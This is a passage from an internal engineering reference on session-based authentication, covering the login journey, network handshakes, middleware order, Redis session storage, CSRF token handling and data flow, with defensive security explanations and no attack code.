# Session-Based Authentication System — Internal Engineering & Security Document

**Classification:** Internal Engineering Reference  
**Audience:** Senior Engineers, Security Engineers, Systems Architects  
**Scope:** Full-stack breakdown of a production Session-Based Authentication System  
**Architecture assumed:** Multi-instance web application with centralized Redis session store, PostgreSQL user database, nginx reverse proxy, and a React/traditional SPA frontend.

---

## Table of Contents

1. [User Journey (Narrative)](#1-user-journey-narrative)
2. [Network Layer Flow](#2-network-layer-flow)
3. [Application Layer Flow](#3-application-layer-flow)
4. [Backend Architecture](#4-backend-architecture)
5. [Authentication & Authorization Flow](#5-authentication--authorization-flow)
6. [Data Flow](#6-data-flow)
7. [Security Controls](#7-security-controls)
8. [Attack Surface Mapping](#8-attack-surface-mapping)
9. [Attack Scenarios (Very Detailed)](#9-attack-scenarios-very-detailed)
10. [Failure Points](#10-failure-points)
11. [Mitigations](#11-mitigations)
12. [Observability](#12-observability)
13. [Scaling Considerations](#13-scaling-considerations)
14. [Interview Questions](#14-interview-questions)

---

## 1. User Journey (Narrative)

### System Topology

```
Browser → CDN (static assets only) → nginx (reverse proxy + TLS termination)
       → Application Server pool (Node.js / Python / Java)
       → Redis (session store, centralized, shared across all app instances)
       → PostgreSQL (user records, persistent data)
```

This is a **server-side session** model. The server holds all session state. The browser holds only an opaque session identifier (a cookie). Every authenticated request requires the server to look up that identifier in the session store to reconstruct user state. This is the defining characteristic — and the core tradeoff — of session-based auth.

---

### Step-by-Step Narrative

#### T+0ms — User navigates to the login page

User opens `https://app.example.com/login`. The browser has no session cookie for this domain (first visit, or after logout/expiry).

**What the user sees:** The login form begins rendering.

**What actually happens:** DNS resolution, TCP + TLS handshake (detailed in Section 2), then:

```http
GET /login HTTP/2
Host: app.example.com
Accept: text/html,application/xhtml+xml,...
Cookie: (none — no session cookie exists)
```

The server's session middleware runs first (before any route handler). It reads the `Cookie` header. No session cookie → no session lookup → request proceeds as unauthenticated. The `/login` route is publicly accessible — the server renders and returns the login page HTML (or a 200 with the SPA shell that client-side routes to `/login`).

No session is created yet. The server does not issue a cookie on this GET request — there is nothing to persist.

---

#### T+~300ms — User submits credentials

User fills in email and password, clicks "Sign In." The browser fires:

```http
POST /auth/login HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded  (traditional form)
   OR
Content-Type: application/json                   (SPA/AJAX)
Cookie: (none)
Origin: https://app.example.com

email=user%40example.com&password=hunter2
```

**CSRF protection at this point:** For the login POST specifically, CSRF protection is less critical than for authenticated actions — an attacker tricking you into logging in as the attacker is a "login CSRF" that leads to session fixation (covered in Section 9). The defense is handled differently (session fixation prevention).

---

#### T+~300–600ms — Auth service validates credentials

The application's session middleware runs first. No session cookie → no session lookup. Proceeds to the login route handler.

**Route handler:**

1. Extracts `email` and `password` from the request body.
2. Validates input (format, length bounds).
3. Queries PostgreSQL:
   ```sql
   SELECT id, email, password_hash, is_active, roles, created_at
   FROM users
   WHERE email = $1
   LIMIT 1;
   ```
   The query uses a parameterized statement — the email is a bind parameter, not interpolated into the SQL string.
4. If no user found: wait the same amount of time as if a user was found (constant-time response to prevent user enumeration via timing), then return a generic error.
5. If user found: verify the password against `password_hash` using `Argon2id` or `bcrypt`. This takes 100–300ms by design.
6. If password incorrect: increment a per-email failure counter in Redis. Return generic error (never specify which field was wrong — that's enumeration).
7. If password correct: proceed to session creation.

---

#### T+~600ms — Session creation

This is the moment authentication converts to an ongoing session. The server:

**Step 1: Generate a session ID.**

```
session_id = CSPRNG(32 bytes) → base64url encoding
           = e.g., "dGhpcyBpcyBhIHNlY3VyZSByYW5kb20gc2Vzc2lvbiBpZA"
```

This must be 128–256 bits of output from a cryptographically secure pseudo-random number generator. The exact function:
- Python: `secrets.token_urlsafe(32)`
- Node.js: `crypto.randomBytes(32).toString('base64url')`
- Java: `SecureRandom.getInstanceStrong()` + base64url

**Why this matters:** A predictable session ID is an attack (session prediction). With 256 bits of entropy, the probability of guessing a valid session ID is 1/2^256 — computationally infeasible.

**Step 2: Build the session data object.**

```json
{
  "user_id": "uuid-abc123",
  "email": "user@example.com",
  "roles": ["user"],
  "created_at": 1700000000,
  "last_activity_at": 1700000000,
  "ip_at_creation": "203.0.113.42",
  "ua_at_creation_hash": "sha256:a1b2c3...",
  "csrf_token": "random-256-bit-value"
}
```

**Step 3: Write to Redis.**

```
Key:   "session:" + session_id
Value: JSON-serialized session object (or MessagePack for compactness)
TTL:   86400 seconds (24 hours absolute), OR
       sliding TTL: reset to 30 minutes on each request
```

The Redis write must complete before the response is sent. If Redis is unavailable at this moment, the login fails. This is the synchronous dependency on the session store — a fundamental characteristic of session-based auth.

**Step 4: Issue the session cookie.**

```http
HTTP/2 200
Set-Cookie: session_id=dGhpcyBpcyBhIHNlY3VyZSByYW5kb20gc2Vzc2lvbiBpZA;
            Path=/;
            Domain=app.example.com;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=86400
```

Every attribute matters and is a deliberate security decision (analyzed in detail in Section 7).

**Step 5: Redirect the user.**

```http
HTTP/2 302
Location: /dashboard
```

The browser follows the redirect. The next GET `/dashboard` will include the session cookie.

---

#### T+~700ms — First authenticated request

```http
GET /dashboard HTTP/2
Host: app.example.com
Cookie: session_id=dGhpcyBpcyBhIHNlY3VyZSByYW5kb20gc2Vzc2lvbiBpZA
```

The server's session middleware:

1. Reads the `Cookie` header.
2. Finds `session_id=...`.
3. Extracts the raw session ID value.
4. Queries Redis:
   ```
   GET "session:" + session_id
   → (JSON session data)
   ```
5. Deserializes the session object.
6. Validates: session exists, not expired (TTL not yet zero), user still active (optional DB check).
7. If sliding TTL: `EXPIRE "session:" + session_id 1800` (reset the TTL).
8. Attaches `req.session` (or `request.user`) to the request context.
9. Route handler runs with the session data available.

**What the user sees:** The dashboard loads with their data.

**Every subsequent request** to a protected endpoint repeats steps 1–9. This Redis round-trip (typically 0.5–2ms for local Redis) is the per-request cost of session-based auth.

---

#### T+86400s (24 hours) — Session expiry

Redis's TTL reaches zero. The key is automatically deleted by Redis (passive expiration + active expiration via Redis's background sweep). The user's next request finds no session in Redis. Server returns 401 or redirects to `/login`. From the user's perspective: they're logged out after inactivity or absolute timeout.

---

#### Logout

```http
POST /auth/logout HTTP/2
Cookie: session_id=...
```

Server:
1. Reads session ID from cookie.
2. Deletes from Redis: `DEL "session:" + session_id` — immediate, synchronous.
3. Responds with a cookie-clearing directive:
   ```http
   Set-Cookie: session_id=; Max-Age=0; Path=/; HttpOnly; Secure; SameSite=Lax
   ```
   Setting `Max-Age=0` (or a past `Expires`) instructs the browser to delete the cookie immediately.
4. Redirects to `/login` or returns 204.

The session is gone from Redis. Even if someone captured the session ID cookie, they get a Redis miss on the next request. Unlike JWTs, revocation is immediate and reliable.

---

## 2. Network Layer Flow

### DNS Resolution

```
Browser DNS cache (TTL-bounded)
  │ MISS
  ▼
OS resolver stub (/etc/resolv.conf or system settings)
  │
  ▼
Configured recursive resolver (8.8.8.8, 1.1.1.1, corporate DNS)
  │
  ├─ Query: Root nameservers (13 logical, anycast)
  │         "Who handles .com?"
  │         <── "ns1.verisign.com, ..." (referral)
  │
  ├─ Query: .com TLD nameservers (Verisign)
  │         "Who handles example.com?"
  │         <── "ns1.example.com, ns2.example.com" (referral)
  │
  └─ Query: example.com authoritative nameservers
            "What is the IP for app.example.com?"
            <── A: 203.0.113.10 (nginx reverse proxy / load balancer)
                 TTL: 300s
```

**DNSSEC**: If `example.com` has DNSSEC enabled, the resolver validates RRSIG records at each step of the chain using DNSKEY records, anchored at the root's trust anchor (published and updated via RFC 5011). Validation failure → SERVFAIL → client cannot connect. This prevents DNS cache poisoning (Kaminsky-style attacks where forged DNS responses redirect clients to attacker-controlled IPs).

**DNS over HTTPS (DoH) / DNS over TLS (DoT)**: Modern browsers (Firefox, Chrome) support DoH, sending encrypted DNS queries to resolvers like 1.1.1.1 or 8.8.8.8. This prevents ISP-level DNS observation and interception but does not change the resolution mechanics — only the transport.

**Failure mode — DNS hijacking**: An attacker on the local network (coffee shop Wi-Fi) poisons the local resolver's cache to return their IP for `app.example.com`. The user connects to the attacker's server. Without DNSSEC validation at the resolver AND HSTS/certificate pinning on the client, a MitM attack becomes possible. With HSTS preloading: the browser refuses to connect over HTTP, and the attacker's fraudulent HTTPS certificate won't be trusted (unless they've also compromised a CA — extremely rare).

---

### TCP 3-Way Handshake

```
Client (browser)                        nginx (203.0.113.10:443)
       │                                         │
       │  SYN                                    │
       │  seq=x                                  │
       │  MSS=1460 (Ethernet MTU 1500 - 40B hdr) │
       │  SACK permitted                         │
       │  Window scale = 7 (window x 128)        │
       │  Timestamps option (RTT measurement)    │
       │────────────────────────────────────────>│
       │                                         │
       │  SYN-ACK                                │
       │  seq=y, ack=x+1                         │
       │  MSS=1460                               │
       │  Window = 65535 x scale                 │
       │<────────────────────────────────────────│
       │                                         │
       │  ACK                                    │
       │  ack=y+1                                │
       │────────────────────────────────────────>│
       │  [connection established -- 1 RTT]      │
```

**Key TCP options negotiated in SYN/SYN-ACK:**

- **MSS (Maximum Segment Size)**: Maximum data per TCP segment. For Ethernet (MTU=1500), MSS=1460 (1500 minus 20B IP header minus 20B TCP header). Larger MTU paths (jumbo frames in data centers, MTU=9000) allow MSS=8960 — fewer segments for large responses.
- **Window scaling**: The 16-bit `Window` field caps at 65535 bytes. With window scaling, the effective window is `Window x 2^scale`. Essential for high-bandwidth, high-latency links.
- **SACK (Selective ACK)**: Allows the receiver to acknowledge non-contiguous segments. Without SACK, any lost segment requires retransmission of all subsequent segments.
- **Timestamps**: Enables more accurate RTT measurement and protects against TIME_WAIT sequence number wrapping (PAWS).

**Connection reuse (HTTP/2):** HTTP/2 multiplexes multiple streams over a single TCP connection. The login POST and the subsequent dashboard GET share one TCP connection. This amortizes the TCP handshake cost.

---

### TLS 1.3 Handshake (Full Detail)

```
Client                                                   nginx
  │                                                         │
  │  ClientHello                                            │
  │  - max_version: TLS 1.3                                 │
  │  - cipher_suites:                                       │
  │      TLS_AES_256_GCM_SHA384                             │
  │      TLS_AES_128_GCM_SHA256                             │
  │      TLS_CHACHA20_POLY1305_SHA256                       │
  │  - extensions:                                          │
  │      supported_versions: [TLS 1.3, TLS 1.2]            │
  │      key_share: X25519 ephemeral public key (32B)       │
  │      SNI: "app.example.com"                             │
  │      ALPN: ["h2", "http/1.1"]                           │
  │      session_ticket: (cached ticket for 0-RTT)          │
  │────────────────────────────────────────────────────────>│
  │                                                         │
  │  ServerHello                                            │
  │  - version: TLS 1.3                                     │
  │  - cipher_suite: TLS_AES_256_GCM_SHA384                 │
  │  - key_share: server's X25519 ephemeral pub key (32B)   │
  │                                                         │
  │  EncryptedExtensions (now encrypted)                    │
  │  - ALPN: "h2"                                           │
  │  - server_name confirmed                                │
  │                                                         │
  │  Certificate                                            │
  │  - leaf: app.example.com                                │
  │  - intermediate: DigiCert / Let's Encrypt               │
  │  - OCSP staple (revocation proof, 7-day max)            │
  │  - SCTs (2+ CT log signatures for cert transparency)    │
  │                                                         │
  │  CertificateVerify                                      │
  │  - signature over handshake transcript hash             │
  │  - proves server possesses cert's private key           │
  │                                                         │
  │  Finished                                               │
  │  - HMAC over entire handshake transcript                │
  │<────────────────────────────────────────────────────────│
  │                                                         │
  │  Finished                                               │
  │  - client's HMAC over handshake transcript              │
  │  [Application data can now flow -- HTTP/2 begins]       │
  │────────────────────────────────────────────────────────>│
```

**Key derivation in TLS 1.3:**

Both parties compute the same X25519 ECDH shared secret:
```
shared_secret = server_private_key x client_public_key
             = client_private_key x server_public_key
             (same result by ECDH commutativity)
```

This shared secret is fed into HKDF (HMAC-based Key Derivation Function, RFC 5869):

```
early_secret     = HKDF-Extract(salt=0, IKM=PSK or 0)
handshake_secret = HKDF-Extract(
                     salt=Derive-Secret(early_secret, "derived"),
                     IKM=ECDH_shared_secret
                   )
master_secret    = HKDF-Extract(
                     salt=Derive-Secret(handshake_secret, "derived"),
                     IKM=0
                   )

Application traffic keys:
  client_write_key = HKDF-Expand-Label(master_secret, "c ap traffic", ...)
  server_write_key = HKDF-Expand-Label(master_secret, "s ap traffic", ...)
```

Each direction has its own encryption key. AES-256-GCM records use a unique nonce per record — nonce reuse would break AEAD confidentiality.

**Certificate validation by the browser:**

1. Build chain: leaf → intermediate → root. Root must be in the OS/browser trust store.
2. Verify each signature in the chain.
3. Check `NotBefore` and `NotAfter` on each cert.
4. Check SAN (Subject Alternative Name) matches `app.example.com`.
5. OCSP staple: Validate the OCSP response. If no staple: OCSP soft-fail (most browsers allow — a known weakness).
6. CT (Certificate Transparency): At least 2 SCTs from different CT logs, embedded in cert or stapled via TLS extension.

---

### Full Network Flow Diagram

```
BROWSER                  NGINX (EDGE)          APP SERVER           REDIS          POSTGRESQL
   │                          │                     │                  │                │
   │-DNS: app.example.com--> [anycast DNS]           │                  │                │
   │<-- 203.0.113.10 ─────────│                     │                  │                │
   │                          │                     │                  │                │
   │--TCP SYN ──────────────> │                     │                  │                │
   │<- TCP SYN-ACK ───────────│                     │                  │                │
   │--TCP ACK ──────────────> │                     │                  │                │
   │                          │                     │                  │                │
   │--TLS ClientHello ──────> │                     │                  │                │
   │<- ServerHello+Cert+Fin ──│                     │                  │                │
   │--TLS Finished + HTTP/2 > │                     │                  │                │
   │                          │                     │                  │                │
   │  [PHASE: Login]          │                     │                  │                │
   │--POST /auth/login ──────>│--upstream proxy───> │                  │                │
   │  {email, password}       │                     │--GET session:ID->│                │
   │                          │                     │<- (nil) ─────────│                │
   │                          │                     │                  │                │
   │                          │                     │--SELECT user ───────────────────> │
   │                          │                     │<- {user record} ──────────────── │
   │                          │                     │  [Argon2id verify ~200ms]         │
   │                          │                     │--SET session:ID->│                │
   │                          │                     │<- OK ────────────│                │
   │<- 302 + Set-Cookie ──────│<- 302 + Set-Cookie -│                  │                │
   │   session_id=...         │                     │                  │                │
   │                          │                     │                  │                │
   │  [PHASE: Authenticated Request]                │                  │                │
   │--GET /dashboard ────────>│--upstream proxy───> │                  │                │
   │  Cookie: session_id=...  │                     │--GET session:ID->│                │
   │                          │                     │<- {user data} ───│                │
   │                          │                     │  [validate + refresh TTL]         │
   │                          │                     │--EXPIRE session: >│                │
   │                          │                     │--SELECT user_data──────────────>  │
   │                          │                     │<- {dashboard data}─────────────   │
   │<- 200 {dashboard} ───────│<- 200 ──────────────│                  │                │
   │                          │                     │                  │                │
   │  [PHASE: Logout]         │                     │                  │                │
   │--POST /auth/logout ─────>│--upstream proxy───> │                  │                │
   │  Cookie: session_id=...  │                     │--DEL session:ID->│                │
   │                          │                     │<- OK ────────────│                │
   │<- 302 /login + Clear-Cookie─│<- 302 ───────────│                  │                │
```

### Latency Budget

| Step | Latency |
|------|---------|
| DNS (cold) | 30–100ms |
| TCP handshake | 1x RTT (~20–50ms LAN, ~100ms WAN) |
| TLS 1.3 handshake | 1x RTT (0-RTT resumption: ~0ms) |
| nginx proxy overhead | 0.5–2ms |
| Argon2id password verification | 100–300ms |
| Redis SET (session create) | 0.5–2ms |
| PostgreSQL user lookup | 2–10ms |
| **Total login (excl. user time)** | **~200–500ms** |
| **Subsequent request (session lookup)** | **~1–5ms (Redis GET)** |
| Session TTL refresh (EXPIRE) | ~0.5ms (pipelined) |

---

## 3. Application Layer Flow

### Middleware Stack Execution Order

Every HTTP request passes through the middleware stack in a defined order. Understanding this order is essential — security controls depend on it.

```
Incoming Request
  │
  ▼
1. Request logging middleware
   (log method, path, IP, timestamp -- before any processing)
  │
  ▼
2. Rate limiting middleware
   (check Redis counters per IP / per endpoint)
  │
  ▼
3. Request body size limit
   (reject bodies > configured max, e.g., 100KB -- before parsing)
  │
  ▼
4. Body parsing middleware
   (JSON parser, URL-encoded form parser)
  │
  ▼
5. CORS middleware
   (validate Origin header, set Access-Control-* response headers)
  │
  ▼
6. Session middleware  <-- MOST CRITICAL FOR SESSION AUTH
   (read Cookie header -> extract session ID -> Redis lookup -> attach req.session)
  │
  ▼
7. CSRF protection middleware
   (for non-GET requests: validate CSRF token from header/body against session)
  │
  ▼
8. Authentication guard
   (if route requires auth: check req.session exists -> if not, 401/redirect)
  │
  ▼
9. Authorization middleware
   (check req.session.roles against required permissions for this route)
  │
  ▼
10. Route handler
    (business logic)
  │
  ▼
11. Response middleware
    (set security headers: HSTS, CSP, X-Frame-Options, etc.)
  │
  ▼
Response sent
```

The order matters critically:
- Rate limiting (step 2) must run before body parsing (step 4) — a DDoS with large bodies would consume memory before being rate-limited.
- Session middleware (step 6) must run before CSRF (step 7) — the CSRF token is stored in the session.
- Authentication guard (step 8) must run before route handlers — otherwise a handler bug might expose data to unauthenticated users.

---

### Login Request — Detailed HTTP Parsing

**Inbound POST request (form submission):**

```http
POST /auth/login HTTP/2
Host: app.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Origin: https://app.example.com
Referer: https://app.example.com/login
Cookie: (none)
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-Dest: document

email=user%40example.com&password=hunter2
```

**Body parsing — `application/x-www-form-urlencoded`:**

The body is a sequence of `key=value` pairs separated by `&`. URL decoding is applied to each key and value:
- `%40` → `@`
- `+` → space
- `%20` → space

Result: `{email: "user@example.com", password: "hunter2"}`.

**Encoding subtleties:**
- A malformed body (e.g., `email=user@example.com%&password=x`) must be handled gracefully — incomplete percent-encoding should cause a 400, not a crash.
- Double URL encoding (`%2540` → `%40` → `@`) is a known bypass technique. Parsers must not double-decode. Decode exactly once.
- Null bytes (`%00`) in the email field: some parsers stop string processing at null. Validate that the parsed email does not contain null bytes before passing to DB queries.

**JSON body parsing:**

The `Content-Type` must be validated. If the body parser is strict, a `Content-Type: text/plain` with a JSON body should be rejected. This prevents certain CSRF bypass techniques (a `text/plain` form submission from a different origin bypasses CORS preflight but a strict JSON parser rejects it).

**Constructed response — successful login:**

```http
HTTP/2 302
Location: /dashboard
Set-Cookie: session_id=dGhpcyBpcyBhIHNlY3VyZSByYW5kb20gc2Vzc2lvbiBpZA;
            Path=/;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Max-Age=86400
Cache-Control: no-store
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Length: 0
```

**Response for every authenticated request:**

```http
HTTP/2 200
Content-Type: application/json; charset=utf-8
Cache-Control: private, no-store
Vary: Cookie
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; ...
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Referrer-Policy: strict-origin-when-cross-origin

{...response body...}
```

`Vary: Cookie` tells caches (CDN, proxy) that this response varies based on the Cookie header. Without it, a CDN might cache the authenticated user's dashboard response and serve it to unauthenticated users.

---

### Cookie Parsing — Exactness Matters

When the browser sends `Cookie: session_id=abc123; other_cookie=xyz`, the server parses:

1. Split on `; ` (semicolon + space).
2. For each pair, split on the first `=`.
3. The cookie name is `session_id`; the value is `abc123`.

**Edge cases:**
- Cookie value can be quoted: `session_id="abc123"`. The server must strip quotes.
- Multiple cookies with the same name: browser sends them all, server typically uses the first occurrence. This is a known cookie injection vulnerability vector.
- Cookie size limits: browsers limit individual cookies to 4096 bytes and total cookies per domain to 80+. Session IDs (base64url of 32 bytes = 43 chars) are well under this limit.

---

## 4. Backend Architecture

### Service Dependency Map

```
                    ┌──────────────────────────────────────────────────────┐
                    │                APPLICATION CLUSTER                    │
                    │                                                      │
Internet ──────────►│  nginx (load balancer + TLS termination)            │
                    │       │                                              │
                    │       ├──────────────────────────────────────┐       │
                    │       ▼                                      ▼       │
                    │  App Instance 1              App Instance N          │
                    │  (Node.js/Python/Java)       (same codebase)         │
                    │       │                             │                │
                    │       └────────┬────────────────────┘                │
                    │                │ (all instances share same stores)   │
                    │       ┌────────▼────────┐  ┌────────────────────┐   │
                    │       │  Redis Cluster  │  │   PostgreSQL       │   │
                    │       │  (session store │  │   (user records,   │   │
                    │       │   rate limits,  │  │    persistent data)│   │
                    │       │   CSRF tokens)  │  └────────────────────┘   │
                    │       └─────────────────┘                           │
                    │                                                      │
                    │  Background Workers:                                  │
                    │  - Session cleanup (expired session logging/audit)   │
                    │  - Rate limit counter reset (cron if not TTL-based)  │
                    │  - Audit log exporter (async, to SIEM)               │
                    └──────────────────────────────────────────────────────┘
```

### Why All Instances Must Share the Session Store

This is the foundational constraint of server-side sessions in a multi-instance deployment.

If App Instance 1 creates a session and writes it to local memory, and the next request (after nginx round-robins to App Instance 2) can't find that session, the user is treated as unauthenticated. This is the "sticky session" problem.

**Solutions:**

**Option A: Sticky sessions (bad for availability)**
nginx routes each client to the same app instance (based on IP hash or a cookie):
```nginx
upstream app {
    ip_hash;  # or hash $cookie_session_id;
    server 10.0.1.1:3000;
    server 10.0.1.2:3000;
    server 10.0.1.3:3000;
}
```
Problem: If the instance goes down, all its sessions are lost (local state). Also skews load.

**Option B: Centralized session store (correct approach)**
Redis holds all sessions. All app instances read/write the same Redis cluster. nginx load-balances freely — any instance can serve any user.

**Redis session store specifics:**

- Redis is single-threaded per shard (commands are processed atomically). No session data race conditions on write.
- Read-then-modify operations need Lua scripts or Redis transactions (`MULTI/EXEC`) for atomicity.
- Redis data is in-memory — fast (~100K ops/second per node, sub-ms latency on LAN).
- Configure AOF with `appendfsync=everysec` for a 1-second maximum data loss window on crash.

---

### Database Schema

**users table:**

```sql
CREATE TABLE users (
  id            UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  email         VARCHAR(255) UNIQUE NOT NULL,
  email_verified BOOLEAN NOT NULL DEFAULT false,
  password_hash  VARCHAR(255) NOT NULL,   -- Argon2id hash string including salt
  created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  updated_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_login_at TIMESTAMPTZ,
  is_active     BOOLEAN NOT NULL DEFAULT true,
  roles         TEXT[] NOT NULL DEFAULT '{user}'
);

CREATE UNIQUE INDEX idx_users_email ON users(email);
```

**Authenticated request path:**

Session data contains `user_id` and `roles` — typically sufficient for authorization decisions without a DB call. Only specific operations (fetching user profile, checking account status after a password change) need DB calls on authenticated requests. The session is the cache for identity data.

**When to re-validate against DB:**

- Never: Accept session data at face value until expiry. Risk: a disabled user's session remains valid until expiry.
- On every request: DB lookup of `is_active` per request. Correct but adds DB load.
- Practical pattern: Store a `user_version` counter in the user's DB record, include it in the session. On each request, check if `session.user_version == db.user_version` (with Redis-cached DB value). If mismatch: session stale, force re-auth.

---

### Sync vs. Async Flows

| Operation | Sync/Async | Reason |
|---|---|---|
| Password hash verification (Argon2id) | Sync | User waiting; blocking is the security feature |
| Redis session write (login) | Sync | Must complete before cookie is sent |
| Redis session read (each request) | Sync | Cannot proceed without session data |
| Redis session delete (logout) | Sync | Must complete before returning 204 — else race where token is reused |
| PostgreSQL user lookup (login) | Sync | Needed for password hash |
| PostgreSQL UPDATE last_login_at | Async (fire and forget after response) | Not critical path |
| Audit log publish to Kafka/SQS | Async | Slow Kafka writes must not add latency |
| Email notification (login from new device) | Async | Non-blocking; eventual delivery ok |
| Rate limit counter increment | Sync (Redis) | Must happen before allowing login through |

---

### CSRF Token Management

CSRF tokens are stored in the session (server-side), not in a cookie. Flow:

1. **On first page load (GET /login)**: Server generates a CSRF token: `csrf_token = CSPRNG(32 bytes)`. Stores it in the session. Returns it embedded in the HTML form as a hidden field, OR in a response header that JavaScript reads.

2. **On form submission (POST /auth/login)**: Client sends the CSRF token in:
   - Hidden form field: `<input type="hidden" name="_csrf" value="...">` (traditional forms)
   - Custom header: `X-CSRF-Token: ...` (AJAX/SPA)

3. **Server validation**: Session middleware has loaded `req.session.csrf_token`. CSRF middleware compares it to the submitted value using constant-time comparison. Mismatch → 403.

**Why this works:** An attacker on `evil.com` can send a cross-origin POST to `app.example.com` (the cookie is sent due to `SameSite=None` or legacy behavior), but they cannot read the victim's session cookie (HttpOnly) or the CSRF token embedded in the HTML (same-origin policy prevents cross-origin reads). So they can't include the correct CSRF token.

---

## 5. Authentication & Authorization Flow

### Session Lifecycle State Machine

```
[No Session]
       │
       │  POST /auth/login (valid credentials)
       ▼
[Active Session] <────────────────────────────────────────────────────┐
       │                                                               │
       │  Request arrives with session cookie                          │
       │  -> Redis GET: session found, not expired                    │
       │  -> Session data attached to request                         │
       │  -> [if sliding TTL] Redis EXPIRE reset                      │
       │  -> Request proceeds as authenticated                         │
       │                                                               │
       ├── User sends request (valid session) ────────────────────────┘
       │
       ├── User does POST /auth/logout
       │      -> Redis DEL session_id
       │      -> Clear cookie in response
       │      [No Session]
       │
       ├── Redis TTL reaches 0 (absolute or idle timeout)
       │      -> Redis auto-deletes key
       │      -> Next request: Redis GET -> nil
       │      [Expired / No Session]
       │
       ├── Admin force-invalidates session
       │      -> Redis DEL session_id (or DEL all "session:user:<uid>:*")
       │      [Invalidated]
       │
       └── Concurrent session limit exceeded
              -> Oldest session evicted (Redis DEL)
              [Evicted]
```

---

### Session Data vs. Database Authority

**What's in the session (the cache):**

```json
{
  "user_id": "uuid-abc123",
  "email": "user@example.com",
  "display_name": "Jane Doe",
  "roles": ["user", "editor"],
  "permissions": ["posts:read", "posts:write"],
  "created_at": 1700000000,
  "last_activity_at": 1700001800,
  "ip_at_creation": "203.0.113.42",
  "csrf_token": "random-256-bit-value",
  "user_version": 7
}
```

**The fundamental tension:**

The session is a point-in-time snapshot of the user's authorization state at login time. If the DBA updates `users.roles` to remove "editor" from the user, the user's session still has `"roles": ["editor"]` until the session expires or an admin explicitly revokes it.

**Session vs. JWT comparison:**

| Property | Session | JWT |
|---|---|---|
| Revocation | Immediate (delete from Redis) | Delayed (until exp, or blacklist) |
| Role/permission update | Immediate (if session invalidated) | Delayed (until token re-issued) |
| Per-request cost | 1 Redis GET (~1ms) | 1 cryptographic verify (~1ms) -- similar |
| Stateful | YES (Redis required) | NO (validation needs only public key) |
| Payload size over wire | ~43 bytes (session ID cookie) | ~600-900 bytes (JWT in Authorization header) |
| Logout reliability | 100% (session deleted from server) | Unreliable without blacklist |

---

### Authorization: RBAC from Session

Once the session is loaded, authorization decisions are pure in-memory logic:

```python
def require_permission(permission):
    def middleware(request, next):
        if permission not in request.session.permissions:
            return Response(403, {"error": "Insufficient permissions"})
        return next(request)
    return middleware

# Usage on route:
app.put("/api/posts/:id",
    require_auth,
    require_permission("posts:write"),
    handler_update_post
)
```

The session carries `permissions` as a list. The middleware checks membership. No database call required for authorization on the request path — the session IS the authorization cache.

---

### Multi-Session Management (Concurrent Logins)

Users often log in from multiple devices. Each login creates a separate session in Redis.

**Session tracking per user:**

```
Redis keys created at login:
  "session:<session_id>" = {session data, TTL}

For per-user session enumeration, also maintain:
  "user_sessions:<user_id>" = SET of session_id values
```

When a new session is created:
```
SADD "user_sessions:<user_id>" "<session_id>"
```

**Force logout all sessions:**
```
SMEMBERS "user_sessions:<user_id>"
-> for each session_id:
     DEL "session:<session_id>"
DEL "user_sessions:<user_id>"
```

This pattern enables: "Log out all other devices" functionality, admin-forced logout on account compromise, session management UI ("You are logged in from 3 devices").

---

## 6. Data Flow

### Login Data Flow (Complete)

```
[1] Browser
    -> HTTP POST body: "email=...&password=..." (URL-encoded bytes)
    -> TLS encryption -> TCP segments -> network packets

[2] nginx
    -> TLS termination (decrypts)
    -> HTTP/2 frame -> HTTP request object
    -> Proxy pass to app server (plain HTTP on internal network, or re-encrypted)
    -> Adds X-Forwarded-For header with client's real IP

[3] App Server -- Middleware Stack
    -> Body parser: URL-decode -> {email: string, password: string}
    -> Input validation: email format, password length bounds
    -> Rate limiter: Redis INCR -> check against limit

[4] App Server -- Route Handler
    -> SQL query: SELECT * FROM users WHERE email = $1
    -> PostgreSQL wire protocol (binary, parameterized)
    -> Receive: {id, email, password_hash, is_active, roles}

[5] App Server -- Password Verification
    -> Argon2id.verify(password, stored_hash)
    -> CPU-bound ~200ms
    -> Returns: boolean

[6] App Server -- Session Creation (on success)
    -> CSPRNG(32 bytes) -> base64url -> session_id string
    -> Build session object: {user_id, email, roles, timestamps, csrf_token}
    -> JSON.serialize(session_object) -> bytes
    -> Redis SET "session:<session_id>" <bytes> EX 86400
    -> Redis returns OK

[7] App Server -- Response Construction
    -> HTTP 302 response
    -> Set-Cookie header with session_id + attributes
    -> No sensitive data in response body

[8] nginx -> Browser
    -> HTTP/2 frame -> TLS encrypt -> TCP -> network
    -> Browser stores cookie (HttpOnly -- JavaScript cannot read it)

[9] Subsequent Requests
    -> Browser automatically appends Cookie header
    -> App server: session middleware reads session_id from Cookie
    -> Redis GET "session:<session_id>"
    -> JSON.parse(redis_value) -> session object
    -> request.session = session_object
    -> Handler has access to user_id, roles, etc.
```

---

### Serialization Formats

| Data | Format | Notes |
|---|---|---|
| HTTP body (login) | `application/x-www-form-urlencoded` or JSON | Depends on client type |
| Cookie value (session ID) | Opaque string, base64url | No structure -- pure random |
| Session data in Redis | JSON (or MessagePack for smaller size) | Structured, compressed if >1KB |
| PostgreSQL queries | Parameterized binary protocol | Values passed as typed parameters |
| Password hash in DB | PHC string format | `$argon2id$v=19$m=65536,t=3,p=4$<salt>$<hash>` |
| Redis keys | UTF-8 strings | `session:<session_id>`, `user_sessions:<user_id>` |
| Audit events | JSON or Protobuf | Published to Kafka |

---

### Where Data Is Validated vs. Where It's Trusted

| Data | Origin | Trusted? | Validation |
|---|---|---|---|
| Email (login body) | Client (untrusted) | NO | Format check, length, SQL parameterization |
| Password (login body) | Client (untrusted) | NO | Length bounds only; never logged |
| Session ID (cookie) | Client (untrusted) | ONLY THE KEY -- value from Redis is trusted | Length check; Redis lookup is authoritative |
| Session DATA (Redis) | Server-written | YES | Schema validation on deserialization |
